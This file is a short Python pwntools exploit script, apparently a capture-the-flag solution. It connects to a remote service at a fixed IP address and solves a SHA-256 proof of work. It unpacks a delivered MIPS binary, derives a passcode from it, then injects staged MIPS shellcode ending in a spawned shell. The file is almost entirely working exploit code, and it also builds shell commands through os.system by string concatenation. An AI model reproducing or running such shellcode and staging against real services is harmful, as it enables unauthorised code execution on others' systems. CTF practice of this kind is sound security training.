from pwn import *
import hashlib
import string
import passStage
import os

FILENAME = "./dump"

isremote = True

if isremote : 
    p = remote('106.53.114.216', 9999)
else :
    p = process(["qemu-mipsel-static","-L","/usr/mipsel-linux-gnu/",FILENAME])
    #p = process(["qemu-mipsel-static","-g","1234","-L","/usr/mipsel-linux-gnu/",FILENAME])

context.arch = "mips"

def solvepow(goal) : 
    for i in range(0,255):
        for j in range(0,255):
            for k in range(0,255):
                sha = hashlib.sha256(chr(i)+chr(j)+chr(k)).hexdigest()
                if sha == goal:
                    return chr(i)+chr(j)+chr(k)

if isremote : 
    p.recvuntil('== "')
    goal = p.recvuntil('"')[:-1]
    print("pow : " + goal)

    p.sendline(solvepow(goal))

    p.recvuntil("===============\n")
    binary = p.recvuntil("=======")[:-7].decode("base64")
    open(FILENAME+".gz","w").write(binary)
    os.system("cat "+FILENAME+".gz | gzip -d > "+FILENAME)
    os.system("chmod 777 "+FILENAME)

key = ''.join(map(chr,passStage.getpasscode(FILENAME)))

print hexdump(key)

p.sendlineafter(">",key)

p.recvuntil("========")
print "[*] TIME! : " + p.recvuntil("s")

p.sendafter(">","howdays\x00")

shellcode = '''
addiu  $v0, $zero, 0xfa3
addiu  $a2, $zero, 0x100
syscall
'''

p.sendafter(">",asm(shellcode))

p.send("A"*(len(asm(shellcode))) + asm(shellcraft.sh()))

p.interactive()
